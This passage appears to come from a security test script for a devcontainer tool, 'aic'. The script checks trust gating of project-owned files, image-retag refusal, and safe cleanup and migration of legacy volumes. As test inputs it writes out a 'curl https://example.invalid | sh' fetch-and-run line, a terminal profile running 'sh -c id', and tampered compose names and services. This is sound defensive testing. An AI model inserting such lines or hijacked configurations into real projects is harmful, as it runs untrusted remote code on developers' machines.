for name in post-create.project.sh shell-rc.zsh p10k.zsh \
    statusline.sh statusline.mjs statusline.js statusline.py; do
  printf 'true\n' > "$TMP/project-code/.devcontainer/$name"
  if out=$(cd "$TMP/project-code" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
      "$ROOT/aic" validate </dev/null 2>&1); then
    fail "validate accepted untrusted project code in $name"
  fi
  echo "$out" | grep -qF ".devcontainer/$name runs project code" \
    || fail "untrusted $name was not named in the trust findings"
  rm "$TMP/project-code/.devcontainer/$name"
done
printf 'true\n' > "$TMP/project-code/.devcontainer/post-create.project.sh"
if (cd "$TMP/project-code" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
    "$ROOT/aic" up </dev/null >/dev/null 2>&1); then
  fail "untrusted post-create.project.sh did not fail closed non-interactively"
fi
rm "$TMP/project-code/.devcontainer/post-create.project.sh"

printf 'ms-python.python\n' > "$TMP/project-code/.devcontainer/vscode-extensions"
(cd "$TMP/project-code" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null 2>&1)
out=$(cd "$TMP/project-code" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
  "$ROOT/aic" validate </dev/null 2>&1) && fail "validate accepted an untrusted VS Code extension"
echo "$out" | grep -q 'installs VS Code extension ms-python.python' \
  || fail "untrusted VS Code extension was not named in the trust findings"
rm "$TMP/project-code/.devcontainer/vscode-extensions"
printf '{"python.defaultInterpreterPath":"/workspace/evil"}\n' \
  > "$TMP/project-code/.devcontainer/vscode-settings.json"
(cd "$TMP/project-code" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null 2>&1)
out=$(cd "$TMP/project-code" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
  "$ROOT/aic" validate </dev/null 2>&1) && fail "validate accepted an untrusted VS Code setting"
echo "$out" | grep -q 'sets VS Code setting python.defaultInterpreterPath' \
  || fail "untrusted VS Code setting was not named in the trust findings"
rm "$TMP/project-code/.devcontainer/vscode-settings.json"
(cd "$TMP/project-code" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null 2>&1)

# A repository can commit the merged result without the project-owned files.
dc="$TMP/project-code/.devcontainer/devcontainer.json"
cp "$dc" "$TMP/project-code-dc"
sed 's|^\( *\)"eamodio.gitlens",|\1"eamodio.gitlens", "evil.extension",|' "$TMP/project-code-dc" > "$dc"
out=$(cd "$TMP/project-code" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
  "$ROOT/aic" validate </dev/null 2>&1) && fail "validate accepted a committed VS Code extension"
echo "$out" | grep -q 'installs VS Code extension evil.extension' \
  || fail "committed VS Code extension was not named in the trust findings"
sed 's|"zsh": { "path": "zsh" }|"zsh": { "path": "sh", "args": ["-c", "id"] }|' "$TMP/project-code-dc" > "$dc"
out=$(cd "$TMP/project-code" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
  "$ROOT/aic" validate </dev/null 2>&1) && fail "validate accepted a changed managed terminal profile"
echo "$out" | grep -q 'managed VS Code setting terminal.integrated.profiles.linux differs' \
  || fail "changed managed VS Code setting was not reported as drift"
cp "$TMP/project-code-dc" "$dc"

# The per-shell rewrite of managed terminal settings is not drift.
new_project "$TMP/project-code-bash"
(cd "$TMP/project-code-bash" && AIC_HOME="$ROOT" "$ROOT/aic" sync --shell bash >/dev/null 2>&1)
(cd "$TMP/project-code-bash" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
  "$ROOT/aic" validate </dev/null >/dev/null 2>&1) \
  || fail "bash shell terminal settings were reported as drift"

# Exact trust covers the file content: approval passes, any edit asks again.
# The pty helper answers the [y/N] prompt like a person, with a deadline.
cat > "$TMP/pty-yes.py" <<'PY'
import os, pty, select, sys, time
pid, fd = pty.fork()
if pid == 0:
    os.execv(sys.argv[1], sys.argv[1:])
buf, sent, deadline = b"", False, time.monotonic() + 120
while True:
    left = deadline - time.monotonic()
    if left <= 0 or not select.select([fd], [], [], left)[0]:
        os.kill(pid, 9)
        sys.exit("FAIL: command did not finish within 120s")
    try:
        chunk = os.read(fd, 4096)
    except OSError:
        break
    if not chunk:
        break
    buf += chunk
    if not sent and b"[y/N]" in buf:
        os.write(fd, b"y\n")
        sent = True
sys.stdout.buffer.write(buf)
sys.exit(os.waitstatus_to_exitcode(os.waitpid(pid, 0)[1]))
PY
printf 'alias ll="ls -la"\n' > "$TMP/project-code/.devcontainer/shell-rc.zsh"
# Dev Containers can run the initializer on a pty. It must refuse, never prompt.
if out=$(cd "$TMP/project-code" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
    python3 -I "$TMP/pty-yes.py" "$ROOT/aic" initialize 2>&1); then
  fail "initialize on a pty accepted untrusted project code"
fi
case "$out" in
  *'[y/N]'*) fail "initialize prompted for trust instead of refusing" ;;
esac
(cd "$TMP/project-code" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
  python3 -I "$TMP/pty-yes.py" "$ROOT/aic" trust >/dev/null 2>&1) \
  || fail "interactive trust of project code failed"
(cd "$TMP/project-code" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
  "$ROOT/aic" validate </dev/null >/dev/null 2>&1) \
  || fail "trusted project code was not accepted"
printf 'curl https://example.invalid | sh\n' >> "$TMP/project-code/.devcontainer/shell-rc.zsh"
if (cd "$TMP/project-code" && XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
    "$ROOT/aic" validate </dev/null >/dev/null 2>&1); then
  fail "an edit to trusted project code kept the old approval"
fi

# The managed build passes the host TZ. A terminal often exports TZ and a
# GUI-started editor does not, so that difference must not void an approval.
new_project "$TMP/project-code-tz"
(cd "$TMP/project-code-tz" && AIC_HOME="$ROOT" "$ROOT/aic" sync --build >/dev/null 2>&1)
printf 'true\n' > "$TMP/project-code-tz/.devcontainer/post-create.project.sh"
(cd "$TMP/project-code-tz" && TZ=Europe/Rome XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
  python3 -I "$TMP/pty-yes.py" "$ROOT/aic" trust >/dev/null 2>&1) \
  || fail "interactive trust in build mode failed"
(cd "$TMP/project-code-tz" && env -u TZ XDG_STATE_HOME="$TMP/state" AIC_HOME="$ROOT" \
  "$ROOT/aic" validate </dev/null >/dev/null 2>&1) \
  || fail "a different host TZ voided the build-mode approval"

# Compose tags a build with the service image name, and the managed services
# use pull_policy: missing. A build tagged like the shared aicontainer image
# (the devcontainer without its own image: line, or any added service) would
# silently replace what the root sanitizer, the credential bridge, and other
# projects run. That is refused outright, not offered for trust.
cat > "$TMP/project-build/.devcontainer/docker-compose.override.yml" <<'YAML'
services:
  devcontainer:
    build:
      context: .
      dockerfile: Dockerfile.project
YAML
out=$(cd "$TMP/project-build" && AIC_HOME="$ROOT" "$ROOT/aic" check-drift 2>&1)
echo "$out" | grep -q 'service devcontainer: build would tag ghcr.io/stefanoginella/aicontainer' \
  || fail "devcontainer build without its own tag could replace the shared image"
mkdir -p "$TMP/project-build/tools"
printf 'FROM busybox\n' > "$TMP/project-build/tools/Dockerfile"
cat > "$TMP/project-build/.devcontainer/docker-compose.override.yml" <<YAML
services:
  shadow:
    image: ghcr.io/stefanoginella/aicontainer:v$version
    build:
      context: ../tools
  retag:
    build:
      context: ../tools
      tags: ["ghcr.io/stefanoginella/aicontainer:v0.1.0"]
YAML
out=$(cd "$TMP/project-build" && AIC_HOME="$ROOT" "$ROOT/aic" check-drift 2>&1)
echo "$out" | grep -q 'service shadow: build would tag ghcr.io/stefanoginella/aicontainer' \
  || fail "added service build could replace the managed image"
echo "$out" | grep -q 'service retag: build would tag ghcr.io/stefanoginella/aicontainer:v0.1.0' \
  || fail "added service build tags could replace another project's pinned image"
cat > "$TMP/project-build/.devcontainer/docker-compose.override.yml" <<'YAML'
services:
  app:
    build:
      context: ../tools
YAML
out=$(cd "$TMP/project-build" && AIC_HOME="$ROOT" "$ROOT/aic" check-drift 2>&1)
echo "$out" | grep -q 'service app: build executes a project-owned Dockerfile as root' \
  || fail "added service build was not trust-gated"

# Destructive automation must spell out --yes.
new_project "$TMP/destroy"
if (cd "$TMP/destroy" && AIC_HOME="$ROOT" "$ROOT/aic" destroy </dev/null >/dev/null 2>&1); then
  fail "non-interactive destroy proceeded without --yes"
fi

# Cleanup parses only the installed trusted template, while shell entry points
# use root-owned managed startup files rather than writable login profiles.
fakebin="$TMP/fakebin"
mkdir "$fakebin"
cat > "$fakebin/tool" <<'SH'
#!/usr/bin/env bash
set -eu
tool=$(basename "$0")
log_call() {
  printf '%s' "$tool" >> "$AIC_TEST_LOG"
  printf ' <%s>' "$@" >> "$AIC_TEST_LOG"
  printf '\n' >> "$AIC_TEST_LOG"
}
if [ "$tool" = docker ]; then
  if [ "${1:-}" = compose ]; then
    # Read-only queries: validation reads the Compose version, then resolves
    # the model. Anything else is logged as an execution below.
    [ "${2:-}" = version ] && exec "$AIC_REAL_DOCKER" "$@"
    for arg in "$@"; do
      if [ "$arg" = config ]; then exec "$AIC_REAL_DOCKER" "$@"; fi
    done
  fi
  case "${1:-} ${2:-}" in
    "context show") printf '%s\n' default; exit 0 ;;
    "context inspect") printf '%s\n' unix:///var/run/docker.sock; exit 0 ;;
    # Socket runtime detection is a read-only query; answer "no daemon".
    "-H unix://"*) [ "${3:-}" = info ] && exit 1 ;;
    # Earlier-identity discovery lists the Compose project of every container
    # that carries the workspace label. Silent unless a test names a project.
    "ps -a")
      if [ -n "${AIC_FAKE_PREVIOUS_PROJECT:-}" ]; then
        log_call "$@"
        printf '%s\n' "$AIC_FAKE_PREVIOUS_PROJECT"
      fi
      exit 0
      ;;
    "ps -aq")
      if [ -n "${AIC_FAKE_LEGACY_CONTAINER:-}" ]; then
        log_call "$@"
        printf '%s\n' "$AIC_FAKE_LEGACY_CONTAINER"
        case " $* " in
          *" volume=${AIC_FAKE_LEGACY_VOLUME:-} "*)
            [ -z "${AIC_FAKE_LEGACY_CONFLICT_CONTAINER:-}" ] \
              || printf '%s\n' "$AIC_FAKE_LEGACY_CONFLICT_CONTAINER"
            ;;
          *" label=com.docker.compose.project=${AIC_FAKE_LEGACY_PROJECT:-} "*)
            case " $* " in
              *" label=devcontainer.local_folder="*) ;;
              *)
                [ -z "${AIC_FAKE_LEGACY_CONFLICT_CONTAINER:-}" ] \
                  || printf '%s\n' "$AIC_FAKE_LEGACY_CONFLICT_CONTAINER"
                [ -z "${AIC_FAKE_LEGACY_AUX_CONTAINER:-}" ] \
                  || printf '%s\n' "$AIC_FAKE_LEGACY_AUX_CONTAINER"
                ;;
            esac
            ;;
        esac
      fi
      exit 0
      ;;
    "info ") exit 0 ;;
    "inspect --format")
      last=${!#}
      if [ "$last" = "${AIC_FAKE_LEGACY_CONTAINER:-}" ] \
          || { [ -n "${AIC_FAKE_LEGACY_CONFLICT_CONTAINER:-}" ] \
            && [ "$last" = "$AIC_FAKE_LEGACY_CONFLICT_CONTAINER" ]; } \
          || { [ -n "${AIC_FAKE_LEGACY_AUX_CONTAINER:-}" ] \
            && [ "$last" = "$AIC_FAKE_LEGACY_AUX_CONTAINER" ]; }; then
        log_call "$@"
        node -e '
          const conflict = process.argv[1] !== process.argv[2];
          const auxiliary = process.argv[1] === process.env.AIC_FAKE_LEGACY_AUX_CONTAINER;
          const labels = {
            "com.docker.compose.project": process.env.AIC_FAKE_LEGACY_PROJECT,
            "com.docker.compose.service": auxiliary ? "socket-proxy" : "devcontainer",
          };
          if (!auxiliary) {
            labels["devcontainer.local_folder"] = conflict
              ? process.env.AIC_FAKE_LEGACY_CONFLICT_WORKSPACE
              : process.env.AIC_FAKE_LEGACY_WORKSPACE;
          }
          const Mounts = auxiliary ? [] : [{
            Type: "volume",
            Name: process.env.AIC_FAKE_LEGACY_VOLUME,
            Destination: conflict
              ? "/home/vscode/.claude-sessions"
              : process.env.AIC_FAKE_LEGACY_DESTINATION,
          }];
          process.stdout.write(JSON.stringify({Config: {Labels: labels}, Mounts}));
        ' "$last" "$AIC_FAKE_LEGACY_CONTAINER"
        exit 0
      fi
      ;;
    "volume inspect")
      log_call "$@"
      last=${!#}
      if [ -n "${AIC_FAKE_VOLUME_STATE:-}" ] \
          && ! grep -Fqx "$last" "$AIC_FAKE_VOLUME_STATE" 2>/dev/null; then
        exit 1
      fi
      if [ "${AIC_FAKE_UNSAFE_VOLUME:-}" = "$last" ]; then
        printf '%s\n' '{"Driver":"local","Options":{"type":"none","o":"bind","device":"/"}}'
      else
        printf '%s\n' '{"Driver":"local","Options":null}'
      fi
      exit 0
      ;;
    "volume create")
      log_call "$@"
      last=${!#}
      if [ -n "${AIC_FAKE_VOLUME_STATE:-}" ] \
          && ! grep -Fqx "$last" "$AIC_FAKE_VOLUME_STATE" 2>/dev/null; then
        printf '%s\n' "$last" >> "$AIC_FAKE_VOLUME_STATE"
      fi
      printf '%s\n' "$last"
      exit 0
      ;;
    "system df") exit 0 ;;
  esac
fi
if [ "$tool" = devcontainer ] && [ -n "${AIC_TEST_ENV_LOG:-}" ]; then
  printf 'COMPOSE_PROJECT_NAME=%s\n' "${COMPOSE_PROJECT_NAME-<unset>}" >> "$AIC_TEST_ENV_LOG"
fi
log_call "$@"
SH
chmod +x "$fakebin/tool"
ln -s tool "$fakebin/docker"
ln -s tool "$fakebin/devcontainer"

new_project "$TMP/cleanup"
printf '%s\n' 'services:' '  attacker:' '    provider:' '      type: must-not-run' \
  > "$TMP/cleanup/.devcontainer/docker-compose.override.yml"
log="$TMP/tool.log"; : > "$log"
(cd "$TMP/cleanup" && PATH="$fakebin:$PATH" AIC_TEST_LOG="$log" AIC_HOME="$ROOT" "$ROOT/aic" down)
grep -q "<$ROOT/template/docker-compose.pull.yml>" "$log" || fail "down did not use trusted installed template"
grep -q 'docker-compose.override.yml' "$log" && fail "down parsed the repository override"
grep -q '<--remove-orphans>' "$log" || fail "down did not remove override-only services as orphans"
: > "$log"
(cd "$TMP/cleanup" && PATH="$fakebin:$PATH" AIC_TEST_LOG="$log" AIC_HOME="$ROOT" "$ROOT/aic" destroy --yes >/dev/null)
grep -q "<$ROOT/template/docker-compose.pull.yml>" "$log" || fail "destroy did not use trusted installed template"
grep -q '<--volumes>' "$log" || fail "destroy did not request per-project Compose volume removal"
grep -q '_aic-sessions>' "$log" || fail "destroy did not explicitly remove the hashed sessions volume"
grep -q '_aic-sanitized-seed>' "$log" || fail "destroy did not explicitly remove the sanitizer volume"
grep -q '<aic-auth-global>' "$log" && fail "destroy attempted to remove global auth"
grep -q '<aic-shell-history>' "$log" && fail "destroy attempted to remove global shell history"

# A repository-controlled top-level name can never steer cleanup at another
# Compose project. Sync remains the recovery path.
sed -E 's/^name:.*/name: victim/' "$TMP/cleanup/.devcontainer/docker-compose.yml" \
  > "$TMP/cleanup/.devcontainer/docker-compose.yml.tmp"
mv "$TMP/cleanup/.devcontainer/docker-compose.yml.tmp" \
  "$TMP/cleanup/.devcontainer/docker-compose.yml"
: > "$log"
if (cd "$TMP/cleanup" && PATH="$fakebin:$PATH" AIC_TEST_LOG="$log" \
    AIC_HOME="$ROOT" "$ROOT/aic" down >/dev/null 2>&1); then
  fail "down accepted a tampered Compose project name"
fi
[ ! -s "$log" ] || fail "tampered project name reached Docker during down"
if (cd "$TMP/cleanup" && PATH="$fakebin:$PATH" AIC_TEST_LOG="$log" \
    AIC_HOME="$ROOT" "$ROOT/aic" destroy --yes >/dev/null 2>&1); then
  fail "destroy accepted a tampered Compose project name"
fi
[ ! -s "$log" ] || fail "tampered project name reached Docker during destroy"
(cd "$TMP/cleanup" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null)
grep -q '^name: victim$' "$TMP/cleanup/.devcontainer/docker-compose.yml" \
  && fail "sync did not repair a tampered Compose project name"

# Old no-name projects may stop only a stack whose Docker labels prove exact
# workspace ownership; destroy requires migration to the hashed identity.
sed '/^name:/d' "$TMP/cleanup/.devcontainer/docker-compose.yml" \
  > "$TMP/cleanup/.devcontainer/docker-compose.yml.tmp"
mv "$TMP/cleanup/.devcontainer/docker-compose.yml.tmp" \
  "$TMP/cleanup/.devcontainer/docker-compose.yml"
: > "$log"
(cd "$TMP/cleanup" && PATH="$fakebin:$PATH" AIC_TEST_LOG="$log" \
  AIC_HOME="$ROOT" "$ROOT/aic" down >/dev/null 2>&1)
[ ! -s "$log" ] || fail "unowned legacy down issued an unconditional Docker cleanup"
if (cd "$TMP/cleanup" && PATH="$fakebin:$PATH" AIC_TEST_LOG="$log" \
    AIC_HOME="$ROOT" "$ROOT/aic" destroy --yes >/dev/null 2>&1); then
  fail "destroy accepted a basename-scoped legacy identity"
fi
[ ! -s "$log" ] || fail "legacy destroy reached Docker before identity migration"
(cd "$TMP/cleanup" && AIC_HOME="$ROOT" "$ROOT/aic" sync >/dev/null)

# A matching devcontainer label cannot authorize project-wide cleanup when a
# second container under the same historical Compose name belongs elsewhere.
# Preserve a mixed stack. A normal owned primary plus a known unlabeled managed
# sidecar is safe; arbitrary orphan services are never included in cleanup.
new_project "$TMP/legacy-cleanup"
sed '/^name:/d' "$TMP/legacy-cleanup/.devcontainer/docker-compose.yml" \
  > "$TMP/legacy-cleanup/.devcontainer/docker-compose.yml.tmp"
mv "$TMP/legacy-cleanup/.devcontainer/docker-compose.yml.tmp" \
  "$TMP/legacy-cleanup/.devcontainer/docker-compose.yml"
cleanup_project="legacy-cleanup_devcontainer"
cleanup_workspace=$(cd "$TMP/legacy-cleanup" && pwd -P)
: > "$log"
out=$(cd "$TMP/legacy-cleanup" && PATH="$fakebin:$PATH" \
  AIC_FAKE_LEGACY_CONTAINER=owned-cleanup-container \
  AIC_FAKE_LEGACY_CONFLICT_CONTAINER=other-cleanup-container \
  AIC_FAKE_LEGACY_CONFLICT_WORKSPACE="$TMP/other-cleanup-workspace" \
  AIC_FAKE_LEGACY_WORKSPACE="$cleanup_workspace" \
  AIC_FAKE_LEGACY_PROJECT="$cleanup_project" \
  AIC_FAKE_LEGACY_VOLUME="${cleanup_project}_aic-sessions" \
  AIC_FAKE_LEGACY_DESTINATION=/home/vscode/.claude-sessions \
  AIC_TEST_LOG="$log" AIC_HOME="$ROOT" "$ROOT/aic" down 2>&1)
echo "$out" | grep -q 'not provably owned by this exact workspace; preserving the whole stack' \
  || fail "mixed-owner legacy cleanup did not warn and preserve"
grep -q '<other-cleanup-container>' "$log" \
  || fail "legacy cleanup did not inspect the conflicting project container"
grep -q '<compose>.*<down>' "$log" \
  && fail "mixed-owner legacy cleanup issued project-wide compose down"

: > "$log"
out=$(cd "$TMP/legacy-cleanup" && PATH="$fakebin:$PATH" \
  AIC_FAKE_LEGACY_CONTAINER=owned-cleanup-container \
  AIC_FAKE_LEGACY_AUX_CONTAINER=owned-socket-proxy \
  AIC_FAKE_LEGACY_WORKSPACE="$cleanup_workspace" \
  AIC_FAKE_LEGACY_PROJECT="$cleanup_project" \
  AIC_FAKE_LEGACY_VOLUME="${cleanup_project}_aic-sessions" \
  AIC_FAKE_LEGACY_DESTINATION=/home/vscode/.claude-sessions \
  AIC_TEST_LOG="$log" AIC_HOME="$ROOT" "$ROOT/aic" down 2>&1)
echo "$out" | grep -q "stopping this workspace's legacy Compose stack '$cleanup_project'" \
  || fail "exclusively owned legacy stack was not selected for cleanup"
grep -q "<compose> <-p> <$cleanup_project>.*<down> <--remove-orphans>" "$log" \
  && fail "legacy cleanup used --remove-orphans on unattributed services"
grep -q "<compose> <-p> <$cleanup_project>.*<down>" "$log" \
  || fail "owned legacy stack with a managed sidecar did not reach trusted compose down"

# Legacy transcript import needs more than a basename-scoped volume name:
# exact canonical-workspace/project labels and the expected session mount must
# all agree. Ambiguous data is preserved and non-interactive startup fails with
# an interactive recovery hint; a fully proven legacy stack migrates silently.
new_project "$TMP/legacy-ambiguous"
sed '/^name:/d' "$TMP/legacy-ambiguous/.devcontainer/docker-compose.yml" \
  > "$TMP/legacy-ambiguous/.devcontainer/docker-compose.yml.tmp"
mv "$TMP/legacy-ambiguous/.devcontainer/docker-compose.yml.tmp" \
  "$TMP/legacy-ambiguous/.devcontainer/docker-compose.yml"
legacy_project="legacy-ambiguous_devcontainer"
legacy_volume="${legacy_project}_aic-sessions"
legacy_state="$TMP/legacy-ambiguous.volumes"
legacy_workspace=$(cd "$TMP/legacy-ambiguous" && pwd -P)
printf '%s\n' "$legacy_volume" > "$legacy_state"
: > "$log"
out=$(cd "$TMP/legacy-ambiguous" && PATH="$fakebin:$PATH" \
  AIC_REAL_DOCKER="$REAL_DOCKER" DOCKER_CONFIG="$REAL_DOCKER_CONFIG" \
  AIC_FAKE_VOLUME_STATE="$legacy_state" \
  AIC_FAKE_LEGACY_CONTAINER=legacy-candidate \
  AIC_FAKE_LEGACY_WORKSPACE="$TMP/not-this-workspace" \
  AIC_FAKE_LEGACY_PROJECT="$legacy_project" \
  AIC_FAKE_LEGACY_VOLUME="$legacy_volume" \
  AIC_FAKE_LEGACY_DESTINATION=/home/vscode/.claude-sessions \
  AIC_TEST_LOG="$log" AIC_HOME="$ROOT" "$ROOT/aic" sync 2>&1)
echo "$out" | grep -q 'cannot be uniquely tied to this workspace' \
  || fail "legacy sync did not report ambiguous transcript ownership"
grep -q '<run>' "$log" && fail "legacy sync copied a volume with mismatched workspace labels"

: > "$log"
set +e
out=$(cd "$TMP/legacy-ambiguous" && PATH="$fakebin:$PATH" \
  AIC_REAL_DOCKER="$REAL_DOCKER" DOCKER_CONFIG="$REAL_DOCKER_CONFIG" \
  AIC_FAKE_VOLUME_STATE="$legacy_state" \
  AIC_FAKE_LEGACY_CONTAINER=legacy-candidate \
  AIC_FAKE_LEGACY_WORKSPACE="$legacy_workspace" \
  AIC_FAKE_LEGACY_PROJECT="$legacy_project" \
  AIC_FAKE_LEGACY_VOLUME="$legacy_volume" \
  AIC_FAKE_LEGACY_DESTINATION=/workspace/not-a-session-root \
  AIC_TEST_LOG="$log" AIC_HOME="$ROOT" "$ROOT/aic" up </dev/null 2>&1)
legacy_rc=$?
set -e
[ "$legacy_rc" -ne 0 ] || fail "non-interactive startup accepted an ambiguous legacy mount"
echo "$out" | grep -q "run 'aic up' in an interactive terminal" \
  || fail "ambiguous legacy startup omitted its interactive recovery hint"
grep -q '<run>' "$log" && fail "ambiguous legacy volume reached the copy helper"
grep -q '^devcontainer ' "$log" && fail "ambiguous legacy volume reached devcontainer startup"

new_project "$TMP/legacy-owned"
sed '/^name:/d' "$TMP/legacy-owned/.devcontainer/docker-compose.yml" \
  > "$TMP/legacy-owned/.devcontainer/docker-compose.yml.tmp"
mv "$TMP/legacy-owned/.devcontainer/docker-compose.yml.tmp" \
  "$TMP/legacy-owned/.devcontainer/docker-compose.yml"
owned_project="legacy-owned_devcontainer"
owned_volume="${owned_project}_aic-sessions"
owned_state="$TMP/legacy-owned.volumes"
owned_workspace=$(cd "$TMP/legacy-owned" && pwd -P)
printf '%s\n' "$owned_volume" > "$owned_state"
: > "$log"
out=$(cd "$TMP/legacy-owned" && PATH="$fakebin:$PATH" \
  AIC_REAL_DOCKER="$REAL_DOCKER" DOCKER_CONFIG="$REAL_DOCKER_CONFIG" \
  AIC_FAKE_VOLUME_STATE="$owned_state" \
  AIC_FAKE_LEGACY_CONTAINER=owned-legacy-container \
  AIC_FAKE_LEGACY_CONFLICT_CONTAINER=other-workspace-container \
  AIC_FAKE_LEGACY_CONFLICT_WORKSPACE="$TMP/other-owned-workspace" \
  AIC_FAKE_LEGACY_WORKSPACE="$owned_workspace" \
  AIC_FAKE_LEGACY_PROJECT="$owned_project" \
  AIC_FAKE_LEGACY_VOLUME="$owned_volume" \
  AIC_FAKE_LEGACY_DESTINATION=/home/vscode/.claude-sessions \
  AIC_TEST_LOG="$log" AIC_HOME="$ROOT" "$ROOT/aic" sync 2>&1)
echo "$out" | grep -q 'cannot be uniquely tied to this workspace' \
  || fail "a concurrently shared legacy volume was not treated as ambiguous"
grep -q '<run>' "$log" && fail "legacy sync copied a volume with a conflicting owner"

: > "$log"
out=$(cd "$TMP/legacy-owned" && PATH="$fakebin:$PATH" \
  AIC_REAL_DOCKER="$REAL_DOCKER" DOCKER_CONFIG="$REAL_DOCKER_CONFIG" \
  AIC_FAKE_VOLUME_STATE="$owned_state" \
  AIC_FAKE_LEGACY_CONTAINER=owned-legacy-container \
  AIC_FAKE_LEGACY_WORKSPACE="$owned_workspace" \
  AIC_FAKE_LEGACY_PROJECT="$owned_project" \
  AIC_FAKE_LEGACY_VOLUME="$owned_volume" \
  AIC_FAKE_LEGACY_DESTINATION=/home/vscode/.claude-sessions \
  AIC_TEST_LOG="$log" AIC_HOME="$ROOT" "$ROOT/aic" up </dev/null 2>&1)
echo "$out" | grep -q 'session migration complete' \
  || fail "exactly owned legacy volume was not migrated automatically"
grep -q "<label=devcontainer.local_folder=$owned_workspace>" "$log" \
  || fail "legacy ownership query omitted the canonical workspace label"
grep -q '<inspect> <--format> <{{json .}}> <owned-legacy-container>' "$log" \
  || fail "legacy ownership did not inspect the candidate container"
grep -q "<$owned_volume:/from:ro>" "$log" \
  || fail "owned legacy volume was not mounted read-only for copying"
hashed_owned_volume=$(sed -n 's/^name:[[:space:]]*//p' \
  "$TMP/legacy-owned/.devcontainer/docker-compose.yml")_aic-sessions
grep -Fqx "$hashed_owned_volume" "$owned_state" \
  || fail "legacy migration did not create the path-unique destination volume"

# A project set up from a wrong-case path (macOS volumes ignore case) carries a
# Compose name hashed from that spelling, while Dev Containers and VS Code use
# the stored one. Sync re-derives the name and copies the transcripts once, but
# only from a name with this project's label and a 12-hex hash that a container
# carrying the exact canonical workspace label proves; a foreign or malformed
# name is never a source. The old stack is then stopped by the same proof.
new_project "$TMP/prev-name"
prev_project="aic-prev-name-0123456789ab"
prev_volume="${prev_project}_aic-sessions"
prev_state="$TMP/prev-name.volumes"
prev_workspace=$(cd "$TMP/prev-name" && pwd -P)
sed -E "s/^name:.*/name: $prev_project/" "$TMP/prev-name/.devcontainer/docker-compose.yml" \
  > "$TMP/prev-name/.devcontainer/docker-compose.yml.tmp"
mv "$TMP/prev-name/.devcontainer/docker-compose.yml.tmp" \
  "$TMP/prev-name/.devcontainer/docker-compose.yml"
printf '%s\n' "$prev_volume" > "$prev_state"
for foreign in aic-other-0123456789ab aic-prev-name-nothexnothex; do
  : > "$log"
  out=$(cd "$TMP/prev-name" && PATH="$fakebin:$PATH" \
    AIC_REAL_DOCKER="$REAL_DOCKER" DOCKER_CONFIG="$REAL_DOCKER_CONFIG" \
    AIC_FAKE_VOLUME_STATE="$prev_state" AIC_FAKE_PREVIOUS_PROJECT="$foreign" \
    AIC_FAKE_LEGACY_CONTAINER=prev-container \
    AIC_FAKE_LEGACY_WORKSPACE="$prev_workspace" \
    AIC_FAKE_LEGACY_PROJECT="$foreign" \
    AIC_FAKE_LEGACY_VOLUME="${foreign}_aic-sessions" \
    AIC_FAKE_LEGACY_DESTINATION=/home/vscode/.aic-sessions \
    AIC_TEST_LOG="$log" AIC_HOME="$ROOT" "$ROOT/aic" sync 2>&1)
  grep -q '<run>' "$log" && fail "sync copied from a project name that is not this project's earlier identity ($foreign)"
  # Put the stale name back: the sync above already re-pinned the real one.
  sed -E "s/^name:.*/name: $prev_project/" "$TMP/prev-name/.devcontainer/docker-compose.yml" \
    > "$TMP/prev-name/.devcontainer/docker-compose.yml.tmp"
  mv "$TMP/prev-name/.devcontainer/docker-compose.yml.tmp" \
    "$TMP/prev-name/.devcontainer/docker-compose.yml"
done
: > "$log"
out=$(cd "$TMP/prev-name" && PATH="$fakebin:$PATH" \
  AIC_REAL_DOCKER="$REAL_DOCKER" DOCKER_CONFIG="$REAL_DOCKER_CONFIG" \
  AIC_FAKE_VOLUME_STATE="$prev_state" AIC_FAKE_PREVIOUS_PROJECT="$prev_project" \
  AIC_FAKE_LEGACY_CONTAINER=prev-container \
  AIC_FAKE_LEGACY_WORKSPACE="$prev_workspace" \
  AIC_FAKE_LEGACY_PROJECT="$prev_project" \
  AIC_FAKE_LEGACY_VOLUME="$prev_volume" \
  AIC_FAKE_LEGACY_DESTINATION=/home/vscode/.aic-sessions \
  AIC_TEST_LOG="$log" AIC_HOME="$ROOT" "$ROOT/aic" sync 2>&1)
echo "$out" | grep -q 'session migration complete' \
  || fail "sync did not migrate the sessions volume of an earlier project identity"
grep -q "<--filter> <label=devcontainer.local_folder=$prev_workspace> <--format>" "$log" \
  || fail "earlier-identity discovery omitted the canonical workspace label"
grep -q "<$prev_volume:/from:ro>" "$log" \
  || fail "earlier-identity volume was not mounted read-only for copying"
prev_new_name=$(sed -n 's/^name:[[:space:]]*//p' "$TMP/prev-name/.devcontainer/docker-compose.yml")
[ "$prev_new_name" != "$prev_project" ] || fail "sync kept the earlier project name"
grep -Fqx "${prev_new_name}_aic-sessions" "$prev_state" \
  || fail "earlier-identity migration did not create the current sessions volume"
# The old stack goes down only on the same proof, never by name alone.
: > "$log"
out=$(cd "$TMP/prev-name" && PATH="$fakebin:$PATH" \
  AIC_REAL_DOCKER="$REAL_DOCKER" DOCKER_CONFIG="$REAL_DOCKER_CONFIG" \
  AIC_FAKE_VOLUME_STATE="$prev_state" AIC_FAKE_PREVIOUS_PROJECT="$prev_project" \
  AIC_FAKE_LEGACY_CONTAINER=prev-container \
  AIC_FAKE_LEGACY_WORKSPACE="$prev_workspace" \
  AIC_FAKE_LEGACY_PROJECT="$prev_project" \
  AIC_FAKE_LEGACY_VOLUME="$prev_volume" \
  AIC_FAKE_LEGACY_DESTINATION=/home/vscode/.aic-sessions \
  AIC_TEST_LOG="$log" AIC_HOME="$ROOT" "$ROOT/aic" up </dev/null 2>&1)
echo "$out" | grep -q "stopping this workspace's legacy Compose stack '$prev_project'" \
